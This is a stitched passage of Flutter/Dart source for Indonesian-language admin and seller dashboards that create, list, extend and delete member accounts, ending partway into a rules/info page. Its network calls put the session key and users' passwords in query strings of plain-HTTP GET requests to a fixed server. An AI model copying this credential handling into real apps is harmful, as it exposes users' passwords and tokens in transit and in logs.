          "Akun '${data['user']['username']}' berhasil dibuat.",
        );
        createUsernameController.clear();
        createPasswordController.clear();
        createDayController.clear();
        newUserRole = 'member';
        _fetchUsers();
      } else {
        _alert("❌ Gagal", data['message'] ?? 'Gagal membuat akun.');
      }
    } catch (_) {
      _alert("🌐 Error", "Gagal menghubungi server.");
    }
    setState(() => isLoading = false);
  }

  // --- METHOD ALERT (STYLE SESUAI SNIPPET & SELLER PAGE) ---
  void _alert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentPurple.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(
              Icons.info_outline,
              color: accentPurple,
            ), // Icon Info Outline sesuai permintaan
            const SizedBox(width: 10),
            Text(
              "Information",
              style: TextStyle(color: primaryWhite),
            ), // Judul tetap Information
          ],
        ),
        content: Text(message, style: TextStyle(color: Colors.white70)),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [primaryPurple, accentPurple]),
                borderRadius: BorderRadius.circular(12),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  "OK",
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInput({
    required String label,
    required TextEditingController controller,
    required IconData icon,
    TextInputType type = TextInputType.text,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 20),
      child: TextField(
        controller: controller,
        keyboardType: type,
        style: TextStyle(color: primaryWhite),
        decoration: InputDecoration(
          labelText: label,
          labelStyle: TextStyle(color: accentPurple),
          prefixIcon: Icon(icon, color: accentPurple),
          filled: true,
          fillColor: cardGlass,
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: accentPurple, width: 2),
          ),
        ),
      ),
    );
  }

  Widget _buildGlassCard({
    required String title,
    required IconData icon,
    required List<Widget> children,
  }) {
    return Container(
      margin: EdgeInsets.only(bottom: 30),
      padding: EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass),
        boxShadow: [
          BoxShadow(
            color: primaryPurple.withOpacity(0.1),
            blurRadius: 15,
            offset: Offset(0, 5),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: primaryPurple.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: accentPurple),
              ),
              SizedBox(width: 12),
              Text(
                title,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          SizedBox(height: 24),
          ...children,
        ],
      ),
    );
  }

  Widget _buildUserItem(Map user) {
    return Container(
      margin: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderGlass),
      ),
      child: Row(
        children: [
          Container(
            padding: EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: primaryPurple.withOpacity(0.2),
              shape: BoxShape.circle,
            ),
            child: Icon(Icons.person, color: accentPurple),
          ),
          SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  user['username'],
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                  ),
                ),
                SizedBox(height: 4),
                Text(
                  "${user['role'].toUpperCase()} | Exp: ${user['expiredDate']}",
                  style: TextStyle(color: Colors.white70, fontSize: 13),
                ),
                SizedBox(height: 2),
                Text(
                  "Parent: ${user['parent'] ?? 'SYSTEM'}",
                  style: TextStyle(color: Colors.white, fontSize: 12),
                ),
              ],
            ),
          ),

          // --- TOMBOL DELETE DENGAN STYLE SNIPPET ---
          Container(
            decoration: BoxDecoration(
              color: Colors.greenAccent.withOpacity(0.1),
              shape: BoxShape.circle,
              border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
            ),
            child: IconButton(
              icon: Icon(Icons.delete_outline, color: Colors.greenAccent),
              onPressed: () async {
                // --- DIALOG KONFIRMASI DELETE (STYLE ALERT) ---
                final confirm = await showDialog<bool>(
                  context: context,
                  builder: (_) => AlertDialog(
                    backgroundColor: bgDark,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(20),
                      side: BorderSide(color: accentPurple.withOpacity(0.3)),
                    ),
                    title: Row(
                      children: [
                        Icon(Icons.info_outline, color: accentPurple),
                        const SizedBox(width: 10),
                        Text(
                          "Konfirmasi",
                          style: TextStyle(color: primaryWhite),
                        ),
                      ],
                    ),
                    content: Text(
                      "Yakin ingin menghapus user '${user['username']}'?",
                      style: TextStyle(color: Colors.white70),
                    ),
                    actions: [
                      Container(
                        width: double.infinity, // Full width
                        margin: EdgeInsets.symmetric(
                          horizontal: 24,
                        ), // Side padding
                        child: Row(
                          mainAxisAlignment:
                              MainAxisAlignment.spaceBetween, // Push to edges
                          children: [
                            // TOMBOL BATAL
                            Container(
                              decoration: BoxDecoration(
                                gradient: LinearGradient(
                                  colors: [primaryPurple, accentPurple],
                                ),
                                borderRadius: BorderRadius.circular(12),
                              ),
                              child: TextButton(
                                onPressed: () => Navigator.pop(context, false),
                                child: Text(
                                  "Batal",
                                  style: TextStyle(
                                    color: primaryWhite,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ),
                            ),

                            // TOMBOL HAPUS (Red Gradient)
                            Container(
                              decoration: BoxDecoration(
                                gradient: LinearGradient(
                                  colors: [Colors.greenAccent, Colors.green],
                                ),
                                borderRadius: BorderRadius.circular(12),
                              ),
                              child: TextButton(
                                onPressed: () => Navigator.pop(context, true),
                                child: Text(
                                  "Hapus",
                                  style: TextStyle(
                                    color: primaryWhite,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                );

                if (confirm == true) {
                  deleteController.text = user['username'];
                  _deleteUser();
                }
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPagination() {
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: List.generate(totalPages, (index) {
        final page = index + 1;
        return ElevatedButton(
          onPressed: () => setState(() => currentPage = page),
          style: ElevatedButton.styleFrom(
            backgroundColor: currentPage == page
                ? accentPurple
                : Colors.transparent,
            foregroundColor: currentPage == page
                ? primaryWhite
                : Colors.white54,
            padding: EdgeInsets.symmetric(horizontal: 16),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(8),
              side: BorderSide(color: borderGlass),
            ),
          ),
          child: Text("$page", style: TextStyle(fontSize: 12)),
        );
      }),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgDark, primaryPurple.withOpacity(0.1), bgDark],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            physics: BouncingScrollPhysics(),
            padding: EdgeInsets.symmetric(horizontal: 20, vertical: 20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                // Header
                Icon(Icons.admin_panel_settings, color: accentPurple, size: 50),
                SizedBox(height: 10),
                Text(
                  "ADMIN DASHBOARD",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 2,
                    shadows: [
                      Shadow(
                        color: primaryPurple.withOpacity(0.8),
                        blurRadius: 10,
                      ),
                    ],
                  ),
                ),
                SizedBox(height: 40),

                // SECTION 1: DELETE USER
                _buildGlassCard(
                  title: "DELETE USER",
                  icon: FontAwesomeIcons.userSlash,
                  children: [
                    _buildInput(
                      label: "Username Target",
                      controller: deleteController,
                      icon: FontAwesomeIcons.user,
                    ),
                    SizedBox(height: 10),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [Colors.greenAccent, Colors.green],
                        ),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.red.withOpacity(0.3),
                            blurRadius: 10,
                            offset: Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _deleteUser,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: const Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.delete, size: 18, color: Colors.white),
                            SizedBox(width: 8),
                            Text(
                              "DELETE ACCOUNT",
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                letterSpacing: 1,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),

                // SECTION 2: CREATE ACCOUNT
                _buildGlassCard(
                  title: "CREATE ACCOUNT",
                  icon: FontAwesomeIcons.userPlus,
                  children: [
                    _buildInput(
                      label: "Username",
                      controller: createUsernameController,
                      icon: FontAwesomeIcons.user,
                    ),
                    _buildInput(
                      label: "Password",
                      controller: createPasswordController,
                      icon: FontAwesomeIcons.lock,
                    ),
                    _buildInput(
                      label: "Durasi (Hari)",
                      controller: createDayController,
                      icon: FontAwesomeIcons.calendarDay,
                      type: TextInputType.number,
                    ),
                    Container(
                      padding: EdgeInsets.symmetric(
                        horizontal: 12,
                        vertical: 4,
                      ),
                      decoration: BoxDecoration(
                        color: Colors.amber.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: borderGlass),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          value: newUserRole,
                          dropdownColor: bgDark,
                          style: TextStyle(color: primaryWhite),
                          items: roleOptions.map((role) {
                            return DropdownMenuItem(
                              value: role,
                              child: Text(role.toUpperCase()),
                            );
                          }).toList(),
                          onChanged: (val) =>
                              setState(() => newUserRole = val ?? 'member'),
                        ),
                      ),
                    ),
                    SizedBox(height: 20),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [primaryPurple, accentPurple],
                        ),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: primaryPurple.withOpacity(0.4),
                            blurRadius: 10,
                            offset: Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _createAccount,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: isLoading
                            ? SizedBox(
                                width: 20,
                                height: 20,
                                child: CircularProgressIndicator(
                                  strokeWidth: 2,
                                  color: primaryWhite,
                                ),
                              )
                            : Text(
                                "CREATE ACCOUNT",
                                style: TextStyle(
                                  color: primaryWhite,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                      ),
                    ),
                  ],
                ),

                // SECTION 3: USER LIST
                _buildGlassCard(
                  title: "USER MANAGEMENT",
                  icon: FontAwesomeIcons.users,
                  children: [
                    Container(
                      padding: EdgeInsets.symmetric(
                        horizontal: 12,
                        vertical: 4,
                      ),
                      decoration: BoxDecoration(
                        color: Colors.amber.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: borderGlass),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          value: selectedRole,
                          dropdownColor: bgDark,
                          style: TextStyle(color: primaryWhite),
                          items: roleOptions.map((role) {
                            return DropdownMenuItem(
                              value: role,
                              child: Text(role.toUpperCase()),
                            );
                          }).toList(),
                          onChanged: (val) {
                            if (val != null) {
                              selectedRole = val;
                              _filterAndPaginate();
                            }
                          },
                        ),
                      ),
                    ),
                    SizedBox(height: 20),
                    isLoading
                        ? Center(
                            child: CircularProgressIndicator(
                              color: accentPurple,
                            ),
                          )
                        : Column(
                            children: [
                              ..._getCurrentPageData()
                                  .map((u) => _buildUserItem(u))
                                  .toList(),
                              SizedBox(height: 20),
                              _buildPagination(),
                            ],
                          ),
                  ],
                ),

                SizedBox(height: 30),
              ],
            ),
          ),
        ),
      ),
    );
  }
}



as http;



class SellerPage extends StatefulWidget {
  final String keyToken; // Sesuaikan nama parameter dengan snippet backend

  const SellerPage({super.key, required this.keyToken});

  @override
  State<SellerPage> createState() => _SellerPageState();
}

class _SellerPageState extends State<SellerPage> {
  List<dynamic> fullUserList = [];
  List<dynamic> filteredList = [];

  // Role Options untuk List
  final List<String> roleOptions = ['member'];
  String selectedRole = 'member';

  int currentPage = 1;
  int itemsPerPage = 25;

  // Controllers
  final createUsernameController = TextEditingController();
  final createPasswordController = TextEditingController();
  final createDayController = TextEditingController();

  final editUsernameController = TextEditingController();
  final editDayController = TextEditingController();

  bool isLoading = false;

  // --- TEMA WARNA UNGU ---
  final Color bgDark = const Color(0xFF0D0221);
  final Color primaryPurple = const Color(0xFF7B1FA2);
  final Color accentPurple = const Color(0xFFEA80FC);
  final Color primaryWhite = Colors.white;
  final Color cardGlass = Colors.white.withOpacity(0.05);
  final Color borderGlass = Colors.white.withOpacity(0.1);

  @override
  void initState() {
    super.initState();
    _fetchUsers();
  }

  Future<void> _fetchUsers() async {
    setState(() => isLoading = true);
    try {
      final res = await http.get(
        Uri.parse('http://papi.queen-official.com:2836/listUsers?key=${widget.keyToken}'),
      );
      final data = jsonDecode(res.body);
      if (data['valid'] == true && data['authorized'] == true) {
        fullUserList = data['users'] ?? [];
        _filterAndPaginate();
      } else {
        _alert("Info", data['message'] ?? 'Gagal memuat user.');
      }
    } catch (_) {
      _alert("Error", "Gagal terhubung ke server.");
    }
    setState(() => isLoading = false);
  }

  void _filterAndPaginate() {
    setState(() {
      currentPage = 1;
      filteredList = fullUserList
          .where((u) => u['role'] == selectedRole)
          .toList();
    });
  }

  List<dynamic> _getCurrentPageData() {
    final start = (currentPage - 1) * itemsPerPage;
    final end = (start + itemsPerPage);
    return filteredList.sublist(
      start,
      end > filteredList.length ? filteredList.length : end,
    );
  }

  int get totalPages => (filteredList.length / itemsPerPage).ceil();

  // --- FITUR 1: CREATE ACCOUNT (SESUAI SNIPPET) ---
  Future<void> _createAccount() async {
    final u = createUsernameController.text.trim();
    final p = createPasswordController.text.trim();
    final d = createDayController.text.trim();

    if (u.isEmpty || p.isEmpty || d.isEmpty) {
      _alert("Peringatan", "Semua field wajib diisi.");
      return;
    }

    setState(() => isLoading = true);
    try {
      final res = await http.get(Uri.parse(
          "http://papi.queen-official.com:2836/createAccount?key=${widget.keyToken}&newUser=$u&pass=$p&day=$d"));
      final data = jsonDecode(res.body);

      if (data['created'] == true) {
        _alert("Sukses", "✅ Akun berhasil dibuat!");
        createUsernameController.clear();
        createPasswordController.clear();
        createDayController.clear();
        _fetchUsers();
      } else {
        // Cek error khusus invalidDay dari backend
        String msg = data['message'] ?? 'Gagal membuat akun.';
        if (data['invalidDay'] == true) {
          msg += " (Max 30 hari untuk Reseller)";
        }
        _alert("Gagal", "❌ $msg");
      }
    } catch (e) {
      _alert("Error", "❌ Koneksi error: $e");
    }
    setState(() => isLoading = false);
  }

  // --- FITUR 2: EDIT USER / ADD DAYS (SESUAI SNIPPET) ---
  Future<void> _editUser() async {
    final u = editUsernameController.text.trim();
    final d = editDayController.text.trim();

    if (u.isEmpty || d.isEmpty) {
      _alert("Peringatan", "Semua field wajib diisi.");
      return;
    }

    setState(() => isLoading = true);
    try {
      final res = await http.get(Uri.parse(
          "http://papi.queen-official.com:2836/editUser?key=${widget.keyToken}&username=$u&addDays=$d"));
      final data = jsonDecode(res.body);

      if (data['edited'] == true) {
        _alert("Sukses", "✅ Durasi berhasil diperbarui.");
        editUsernameController.clear();
        editDayController.clear();
        _fetchUsers(); // Refresh list agar tanggal expired berubah
      } else {
        // Cek error spesifik (misal user tidak member atau tidak ditemukan)
        _alert("Gagal", "❌ ${data['message'] ?? 'Gagal mengubah durasi.'}");
      }
    } catch (e) {
      _alert("Error", "❌ Koneksi error: $e");
    }
    setState(() => isLoading = false);
  }

  void _alert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentPurple.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.info_outline, color: accentPurple),
            const SizedBox(width: 10),
            Text(title, style: TextStyle(color: primaryWhite)),
          ],
        ),
        content: Text(message, style: TextStyle(color: Colors.white70)),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [primaryPurple, accentPurple]),
                borderRadius: BorderRadius.circular(12),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text("OK", style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInput({
    required String label,
    required TextEditingController controller,
    required IconData icon,
    TextInputType type = TextInputType.text,
    String hint = "",
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 15),
      child: TextField(
        controller: controller,
        keyboardType: type,
        style: TextStyle(color: primaryWhite),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          hintStyle: TextStyle(color: Colors.white38),
          labelStyle: TextStyle(color: accentPurple),
          prefixIcon: Icon(icon, color: accentPurple),
          filled: true,
          fillColor: cardGlass,
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: accentPurple, width: 2),
          ),
        ),
      ),
    );
  }

  Widget _buildGlassCard({
    required String title,
    required IconData icon,
    required List<Widget> children,
  }) {
    return Container(
      margin: EdgeInsets.only(bottom: 25),
      padding: EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass),
        boxShadow: [
          BoxShadow(
            color: primaryPurple.withOpacity(0.1),
            blurRadius: 15,
            offset: Offset(0, 5),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: primaryPurple.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: accentPurple),
              ),
              SizedBox(width: 12),
              Text(
                title,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          SizedBox(height: 20),
          ...children,
        ],
      ),
    );
  }

  Widget _buildUserItem(Map user) {
    return Container(
      margin: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderGlass),
      ),
      child: Row(
        children: [
          Container(
            padding: EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: primaryPurple.withOpacity(0.2),
              shape: BoxShape.circle,
            ),
            child: Icon(Icons.person, color: accentPurple),
          ),
          SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  user['username'],
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold, fontSize: 16),
                ),
                SizedBox(height: 4),
                Text(
                  "ROLE: ${user['role'].toString().toUpperCase()} | EXP: ${user['expiredDate']}",
                  style: TextStyle(color: Colors.white70, fontSize: 13),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPagination() {
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: List.generate(totalPages, (index) {
        final page = index + 1;
        return ElevatedButton(
          onPressed: () => setState(() => currentPage = page),
          style: ElevatedButton.styleFrom(
            backgroundColor: currentPage == page ? accentPurple : Colors.transparent,
            foregroundColor: currentPage == page ? primaryWhite : Colors.white54,
            padding: EdgeInsets.symmetric(horizontal: 16),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(8),
              side: BorderSide(color: borderGlass),
            ),
          ),
          child: Text("$page", style: TextStyle(fontSize: 12)),
        );
      }),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgDark, primaryPurple.withOpacity(0.1), bgDark],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            physics: BouncingScrollPhysics(),
            padding: EdgeInsets.symmetric(horizontal: 20, vertical: 20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                Icon(Icons.storefront, color: accentPurple, size: 50),
                SizedBox(height: 10),
                Text(
                  "SELLER DASHBOARD",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 2,
                    shadows: [Shadow(color: primaryPurple.withOpacity(0.8), blurRadius: 10)],
                  ),
                ),
                SizedBox(height: 40),

                // SECTION 1: CREATE ACCOUNT
                _buildGlassCard(
                  title: "CREATE MEMBER",
                  icon: FontAwesomeIcons.userPlus,
                  children: [
                    _buildInput(
                      label: "Username Baru",
                      controller: createUsernameController,
                      icon: FontAwesomeIcons.user,
                    ),
                    _buildInput(
                      label: "Password",
                      controller: createPasswordController,
                      icon: FontAwesomeIcons.lock,
                    ),
                    _buildInput(
                      label: "Durasi (Hari)",
                      controller: createDayController,
                      icon: FontAwesomeIcons.calendarDay,
                      type: TextInputType.number,
                      hint: "Maksimal 30 hari",
                    ),
                    SizedBox(height: 10),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [primaryPurple, accentPurple]),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(color: primaryPurple.withOpacity(0.4), blurRadius: 10, offset: Offset(0, 4))
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _createAccount,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                        child: isLoading
                            ? SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: primaryWhite))
                            : Text("CREATE ACCOUNT", style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
                      ),
                    ),
                  ],
                ),

                // SECTION 2: EDIT / EXTEND DURATION
                _buildGlassCard(
                  title: "EXTEND DURATION",
                  icon: FontAwesomeIcons.clock,
                  children: [
                    _buildInput(
                      label: "Username Target",
                      controller: editUsernameController,
                      icon: FontAwesomeIcons.userEdit,
                      hint: "Username member yang ingin diperpanjang",
                    ),
                    _buildInput(
                      label: "Tambah Hari",
                      controller: editDayController,
                      icon: FontAwesomeIcons.calendarPlus,
                      type: TextInputType.number,
                      hint: "Maksimal 30 hari",
                    ),
                    SizedBox(height: 10),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [Colors.blue, Colors.lightBlueAccent]),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(color: Colors.blue.withOpacity(0.4), blurRadius: 10, offset: Offset(0, 4))
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _editUser,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                        ),
                        child: isLoading
                            ? SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: primaryWhite))
                            : Text("ADD DAYS", style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold)),
                      ),
                    ),
                  ],
                ),

                // SECTION 3: USER LIST
                _buildGlassCard(
                  title: "MEMBER LIST",
                  icon: FontAwesomeIcons.users,
                  children: [
                    Container(
                      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                      decoration: BoxDecoration(
                        color: Colors.black.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: borderGlass),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          value: selectedRole,
                          dropdownColor: bgDark,
                          style: TextStyle(color: primaryWhite),
                          items: roleOptions.map((role) {
                            return DropdownMenuItem(value: role, child: Text(role.toUpperCase()));
                          }).toList(),
                          onChanged: (val) {
                            if (val != null) {
                              selectedRole = val;
                              _filterAndPaginate();
                            }
                          },
                        ),
                      ),
                    ),
                    SizedBox(height: 20),
                    isLoading
                        ? Center(child: CircularProgressIndicator(color: accentPurple))
                        : Column(
                      children: [
                        ..._getCurrentPageData().map((u) => _buildUserItem(u)).toList(),
                        SizedBox(height: 20),
                        _buildPagination(),
                      ],
                    ),
                  ],
                ),
                SizedBox(height: 30),
              ],
            ),
          ),
        ),
      ),
    );
  }
}



as math;

as http;

// ─── Palette ──────────────────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF060B14);
  static const surface   = Color(0xFF0C1424);
  static const card      = Color(0xFF101A2E);
  static const border    = Color(0xFF1A2D4A);
  static const borderLit = Color(0xFF1E3A5F);

  static const blue      = Color(0xFF1B6FBD);
  static const blueMid   = Color(0xFF2D8FE8);
  static const blueLight = Color(0xFF56AEF5);

  static const green     = Color(0xFF22C55E);
  static const amber     = Color(0xFFF59E0B);
  static const red       = Color(0xFFEF4444);
  static const purple    = Color(0xFFA78BFA);

  static const text      = Color(0xFFE2EDF9);
  static const textSub   = Color(0xFF7A9BBF);
  static const textDim   = Color(0xFF3A5470);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [blueMid, blueLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

// ─── Rules data ───────────────────────────────────────────────────────────────
const _rules = [
  _Rule(
    title: 'Larangan Barter Akun',
    desc:  'Akun tidak boleh ditukar dengan barang, jasa, atau akun lain dalam bentuk apa pun.',
    icon:  Icons.swap_horiz_rounded,
    color: Color(0xFFF59E0B),
  ),
  _Rule(
    title: 'Larangan Membagikan Akun',
    desc:  'Setiap akun bersifat pribadi dan hanya boleh digunakan oleh pemilik akun yang terdaftar.',
    icon:  Icons.share_rounded,
    color: Color(0xFF60A5FA),
  ),
  _Rule(
    title: 'Larangan Menjual Akun',
    desc:  'Member TIDAK diperbolehkan menjual akun. Penjualan hanya boleh dilakukan oleh role yang diizinkan secara resmi.',
    icon:  Icons.sell_rounded,
    color: Color(0xFFEF4444),
  ),
  _Rule(
    title: 'Larangan Jual Durasi Ilegal',
    desc:  'Dilarang menjual akses harian, mingguan, trial, atau sejenisnya di luar ketentuan yang telah ditetapkan.',
    icon:  Icons.timer_off_rounded,
    color: Color(0xFFA78BFA),
  ),
  _Rule(
    title: 'Larangan Banting Harga',
    desc:  'Dilarang merusak atau menurunkan harga yang telah ditentukan di bawah ketentuan Sunov.',
    icon:  Icons.trending_down_rounded,
    color: Color(0xFF34D399),
  ),
];

class _Rule {
  final String title;
  final String desc;
  final IconData icon;
  final Color color;
  const _Rule({required this.title, required this.desc,
      required this.icon, required this.color});
}

// ─── Page ─────────────────────────────────────────────────────────────────────
class InfoPage extends StatefulWidget {
  final String sessionKey;
  const InfoPage({super.key, required this.sessionKey});

  @override
  State<InfoPage> createState() => _InfoPageState();
}

class _InfoPageState extends State<InfoPage> with TickerProviderStateMixin {
  Map<String, dynamic>? serverInfo;
  bool isLoading = true;

  bool   _apiOnline   = false;
  int    _pingMs      = 0;
  String _pingStatus  = 'Checking...';
  Timer? _pingTimer;

  // Animations
  late AnimationController _bgCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _pingDotCtrl;
  late AnimationController _sanctionCtrl;

  late Animation<double> _entrance;
  late Animation<double> _pingDot;
  late Animation<double> _sanctionGlow;

  @override
  void initState() {
    super.initState();

    _bgCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 18))
      ..repeat();

    _entranceCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 800));
    _entrance = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic);

    _pingDotCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1200))
      ..repeat(reverse: true);
    _pingDot = Tween<double>(begin: 0.3, end: 1.0)
        .animate(CurvedAnimation(parent: _pingDotCtrl, curve: Curves.easeInOut));

    _sanctionCtrl = AnimationController(
